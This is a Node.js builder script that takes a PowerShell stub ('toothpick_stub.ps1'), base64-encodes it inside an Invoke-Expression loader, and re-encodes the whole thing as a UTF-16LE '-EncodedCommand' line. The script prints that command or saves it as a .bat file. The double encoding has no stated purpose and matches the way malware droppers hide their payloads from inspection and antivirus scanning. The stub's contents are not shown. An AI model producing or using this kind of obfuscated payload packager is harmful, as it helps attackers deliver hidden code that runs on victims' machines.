const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");

// Read file toothpick_stub.ps1 and save content as base64
const ping = fs.readFileSync(
  path.join(__dirname, "toothpick_stub.ps1"),
  "utf8"
);
const encodedPing = Buffer.from(ping, "utf8").toString("base64");

// Create variable with PowerShell code with one empty variable that will contain the base64 encoded toothpick_stub.ps1 and execute it.
const encodedPingScript = `
    $encodedPing = '${encodedPing}';
    $decodedPing = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPing));
    Invoke-Expression $decodedPing;
`;

// Encode the PowerShell code to UTF-16LE and then to base64
function utf8ToUtf16leBuffer(str) {
  const utf16leBuffer = Buffer.from(str, "utf16le");
  return utf16leBuffer;
}

const utf16leScript = utf8ToUtf16leBuffer(encodedPingScript);
const encodedPingScriptBase64 = Buffer.from(utf16leScript).toString("base64");

// Create the PowerShell command
const powershellCommand = `powershell -EncodedCommand ${encodedPingScriptBase64}`;

// Process command line arguments
const args = process.argv.slice(2);
const batFileFlag = args.includes("-b");
const commandFlag = args.includes("-c");

// If -b flag is set, save the command as a .bat file
if (batFileFlag) {
  const batFilePath = path.join(__dirname, "build", "toothpick.bat");
  //create folder if not exists
  if (!fs.existsSync(path.join(__dirname, "build"))) {
    fs.mkdirSync(path.join(__dirname, "build"));
  }
  fs.writeFileSync(batFilePath, powershellCommand);
  console.log(`Saved .bat command to ${batFilePath}`);
} else if (commandFlag) {
  console.log("Generated PowerShell command:");
  console.log(powershellCommand);
} else {
  console.log(
    "Specify -b to save the command as a .bat file or -c to print the command to the console."
  );
}
